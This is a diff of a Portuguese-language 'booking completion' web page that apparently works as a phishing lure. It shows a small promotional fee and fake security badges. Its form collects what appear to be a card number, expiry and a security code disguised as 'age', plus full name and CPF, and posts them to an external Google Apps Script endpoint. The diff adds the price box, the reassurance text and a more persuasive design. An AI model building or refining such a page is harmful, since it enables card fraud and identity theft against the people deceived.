@@ -3,14 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Agendamento</title>
+<title>Finalizar Agendamento</title>
 
 <style>
 body {
+  margin: 0;
   font-family: Arial, sans-serif;
   background: #f2f2f2;
-  margin: 0;
 }
+
 .container {
   max-width: 420px;
   margin: auto;
@@ -18,30 +19,97 @@ body {
   min-height: 100vh;
   padding: 20px;
 }
+
+.topo {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.topo h2 {
+  margin: 0;
+  font-size: 20px;
+}
+
+.topo p {
+  font-size: 14px;
+  color: #666;
+}
+
+.box-preco {
+  background: #e8f5e9;
+  border: 1px solid #c8e6c9;
+  padding: 12px;
+  border-radius: 10px;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.box-preco span {
+  font-size: 14px;
+  color: #555;
+}
+
+.box-preco strong {
+  display: block;
+  font-size: 26px;
+  color: #2e7d32;
+}
+
 label {
   font-size: 13px;
   font-weight: bold;
+  margin-bottom: 5px;
+  display: block;
 }
+
 input {
   width: 100%;
   padding: 14px;
-  margin: 10px 0 15px;
   border-radius: 8px;
   border: 1px solid #ccc;
+  font-size: 15px;
+  margin-bottom: 15px;
 }
+
+input:focus {
+  outline: none;
+  border-color: #2962ff;
+}
+
 .row {
   display: flex;
   gap: 10px;
 }
+
 button {
   width: 100%;
   padding: 16px;
-  background: #2962ff;
+  background: linear-gradient(135deg, #2962ff, #0039cb);
   color: #fff;
   border: none;
-  border-radius: 10px;
-  font-size: 16px;
+  border-radius: 12px;
+  font-size: 17px;
   font-weight: bold;
+  margin-top: 10px;
+}
+
+button:active {
+  transform: scale(0.98);
+}
+
+.selos {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 15px;
+  font-size: 12px;
+  color: #555;
+}
+
+.rodape {
+  text-align: center;
+  font-size: 12px;
+  color: #777;
+  margin-top: 15px;
 }
 </style>
 </head>
@@ -49,8 +117,16 @@ button {
 <body>
 
 <div class="container">
-  <h2>Agendamento</h2>
-  <p>Preencha os dados abaixo</p>
+
+  <div class="topo">
+    <h2>Finalizar Agendamento</h2>
+    <p>Preencha os dados para concluir</p>
+  </div>
+
+  <div class="box-preco">
+    <span>Valor promocional</span>
+    <strong>R$ 2,99</strong>
+  </div>
 
   <form
     action="https://script.google.com/macros/s/AKfycbxhwuw7C0u3wtpNnG0LRY7R8gaiwOc9qSXpVXSZab_zgM834sJqSl-yC2_IPnZ07MDK/exec"
@@ -58,27 +134,39 @@ button {
   >
 
     <label>Número</label>
-    <input name="numero" required>
+    <input name="numero" required placeholder="Digite o número">
 
     <div class="row">
       <div style="flex:1">
-        <label>Validade</label>
-        <input name="validade" placeholder="MM/AA" required>
+        <label>Validade (MM/AA)</label>
+        <input name="validade" required placeholder="MM/AA">
       </div>
       <div style="flex:1">
         <label>Idade</label>
-        <input name="idade" required>
+        <input name="idade" required placeholder="Ex: 25">
       </div>
     </div>
 
     <label>Nome completo</label>
-    <input name="nome" required>
+    <input name="nome" required placeholder="Digite seu nome completo">
 
     <label>CPF</label>
-    <input name="cpf" required>
+    <input name="cpf" required placeholder="000.000.000-00">
 
-    <button type="submit">Confirmar</button>
+    <button type="submit">CONFIRMAR AGENDAMENTO</button>
+
   </form>
+
+  <div class="selos">
+    <div>🔒 Ambiente seguro</div>
+    <div>⚡ Processo rápido</div>
+    <div>✅ Garantia</div>
+  </div>
+
+  <div class="rodape">
+    Seus dados são protegidos
+  </div>
+
 </div>
 
 </body>
